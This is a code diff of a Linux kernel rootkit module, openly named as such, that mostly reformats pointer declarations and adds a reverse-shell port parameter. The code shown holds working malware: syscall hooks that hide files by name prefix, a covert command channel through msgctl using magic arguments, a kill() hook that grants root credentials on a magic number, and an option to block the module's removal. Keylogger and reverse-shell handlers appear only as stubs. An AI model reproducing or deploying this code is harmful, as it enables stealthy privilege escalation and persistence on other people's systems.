@@ -21,8 +21,6 @@
 #include <linux/types.h>
 #include <linux/unistd.h>
 #include <net/inet_sock.h>
-#include "arsenal/keylogger.c"
-#include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
@@ -56,7 +54,7 @@ typedef struct timer_list _timer;
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
 	int func_code;
-	char *file_hide_str;
+	char* file_hide_str;
 } action_task;
 
 /**
@@ -73,11 +71,14 @@ static _timer polling_timer;
 static bool block_removal = false;
 module_param(block_removal, bool, 0770);
 MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
-static char *rev_shell_ip = NULL;
+static char* rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
+static char* rev_shell_port = NULL;
+module_param(rev_shell_port, charp, 0770);
+MODULE_PARM_DESC(rev_shell_ip, "Port for reverse shell.");
 // TODO: Convert to array of strings.
-static char *hidden_file_prefix = NULL;
+static char* hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, 0770);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
 static bool keylogger = false;
@@ -96,44 +97,53 @@ static void do_something_on_interval(unsigned long data);
  * // TODO: Fix
  */
 
-void log_info(const char *message) {
+void log_info(const char* message) {
 	printk(KERN_INFO "GARDEN: %s", message);
 }
 
-void log_error(const char *message) {
+void log_error(const char* message) {
 	printk(KERN_ERR "GARDEN: %s", message);
 }
 
 /**
  * Handler for incoming action_tasks. Frees task memory if it doesn't return.
  */
-int handle_task(action_task *task) {
+int handle_task(action_task* task) {
 	printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
+
 	switch (task->func_code) {
-		case GET_ROOT:
-			return get_root();
-		case KEYLOGGER_ENABLE:
-			// TODO
-			break;
-		case KEYLOGGER_DISABLE:
-			// TODO
-			break;
-		case FILE_HIDE_ADD:
-			// TODO
-			break;
-		case FILE_HIDE_RM:
-			// TODO
-			break;
-		case FILE_HIDE_SHOW:
-			// TODO: print contents of hidden_file_prefix array
-			break;
-		case REVERSE_TCP_SHELL:
-			// TODO
-			break;
-		default:
-			printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
-			return -1;
+	case GET_ROOT:
+		return get_root();
+
+	case KEYLOGGER_ENABLE:
+		// TODO
+		break;
+
+	case KEYLOGGER_DISABLE:
+		// TODO
+		break;
+
+	case FILE_HIDE_ADD:
+		// TODO
+		break;
+
+	case FILE_HIDE_RM:
+		// TODO
+		break;
+
+	case FILE_HIDE_SHOW:
+		// TODO: print contents of hidden_file_prefix array
+		break;
+
+	case REVERSE_TCP_SHELL:
+		// TODO
+		break;
+
+	default:
+		printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
+		return -1;
 	};
+
 	return 0;
 }
 
@@ -142,15 +152,15 @@ int handle_task(action_task *task) {
  * are INT_MAX, then the third argument is a pointer to an action task_ struct.
  * Copy that from userspace and process it.
  */
-KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs *);
-static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
-	action_task *task;
+KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs*);
+static long khook___x64_sys_msgctl(const struct pt_regs* regs) {
+	action_task* task;
 	int error;
 
 	if (regs->di == INT_MAX && regs->si == INT_MAX) {
 		printk(KERN_EMERG "sys_msgctl --Incoming command\n");
 		task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
-		copy_from_user(task, (const void *)regs->dx, MAX_TASK_SIZE);
+		copy_from_user(task, (const void*)regs->dx, MAX_TASK_SIZE);
 		error = handle_task(task);
 		kfree(task);
 		return error;
@@ -158,6 +168,16 @@ static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
 		return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
 	}
 }
+
+// /**
+//  * Hook for opening up a reverse shell in response to a specially crafted ICMP
+//  * packet.
+//  */
+// // ssize_t recv(int sockfd, void *buf, size_t len, int flags);
+// KHOOK_EXT(ssize_t, __x64_sys_recv, const struct pt_regs*);
+// static ssize_t khook___x64_sys_recv(const struct pt_regs* regs) {
+// 	return KHOOK_ORIGIN(__x64_sys_recv, regs);
+// }
 
 /**
  * Hide files and directories.
@@ -167,59 +187,66 @@ static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
 /**
  * If this method returns true, the file in question should be hidden.
  */
-static bool should_hide_file(const char *name) {
+static bool should_hide_file(const char* name) {
 	if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
 		printk(KERN_INFO "Hiding: %s\n", name);
 		return true;
 	}
+
 	return false;
 }
 
-KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+KHOOK_EXT(int, fillonedir, void*, const char*, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
+
 	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 }
 
-KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+KHOOK_EXT(int, filldir, void*, const char*, int, loff_t, u64, unsigned int);
+static int khook_filldir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
+
 	return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 }
 
-KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_filldir64(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+KHOOK_EXT(int, filldir64, void*, const char*, int, loff_t, u64, unsigned int);
+static int khook_filldir64(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
+
 	return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 }
 
-KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_compat_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+KHOOK_EXT(int, compat_fillonedir, void*, const char*, int, loff_t, u64, unsigned int);
+static int khook_compat_fillonedir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
+
 	return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 }
 
-KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+KHOOK_EXT(int, compat_filldir, void*, const char*, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
+
 	return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
 }
 
-KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
-struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
+KHOOK_EXT(struct dentry*, __d_lookup, const struct dentry*, const struct qstr*);
+struct dentry* khook___d_lookup(const struct dentry* parent, const struct qstr* name) {
 	if (should_hide_file(name->name)) {
 		return NULL;
 	}
+
 	return KHOOK_ORIGIN(__d_lookup, parent, name);
 }
 
@@ -227,17 +254,18 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
  * Drops the current user into a root shell.
  */
 static int get_root(void) {
-	struct cred *root_creds;
+	struct cred* root_creds;
 	printk(KERN_EMERG "One root coming right up.");
 	root_creds = prepare_kernel_cred(NULL);
 	return commit_creds(root_creds);
 }
 
-KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
-static long khook___x64_sys_kill(const struct pt_regs *regs) {
+KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
+static long khook___x64_sys_kill(const struct pt_regs* regs) {
 	if (regs->di == MAGIC_ROOT_NUM) {
 		return get_root();
 	}
+
 	return KHOOK_ORIGIN(__x64_sys_kill, regs);
 }
 
@@ -247,14 +275,14 @@ static long khook___x64_sys_kill(const struct pt_regs *regs) {
  */
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-static void legacy_timer_function_wrapper(struct timer_list *timer) {
-	struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
+static void legacy_timer_function_wrapper(struct timer_list* timer) {
+	struct legacy_timer_emu* legacy_timer = from_timer(legacy_timer, timer, t);
 	// NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
 	legacy_timer->function(legacy_timer->data);
 }
 #endif
 
-__inline void timer_init_wrapper(_timer *timer, void *func) {
+__inline void timer_init_wrapper(_timer* timer, void* func) {
 	timer->data = 0;
 	timer->function = func;
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
@@ -264,7 +292,7 @@ __inline void timer_init_wrapper(_timer *timer, void *func) {
 #endif
 }
 
-__inline static void set_timer(_timer *timer) {
+__inline static void set_timer(_timer* timer) {
 	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
 	mod_timer(&timer->t, expires);
@@ -274,7 +302,7 @@ __inline static void set_timer(_timer *timer) {
 	// printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
 }
 
-__inline static void timer_cleanup_wrapper(_timer *timer) {
+__inline static void timer_cleanup_wrapper(_timer* timer) {
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
 	del_timer_sync(&timer->t);
 #else
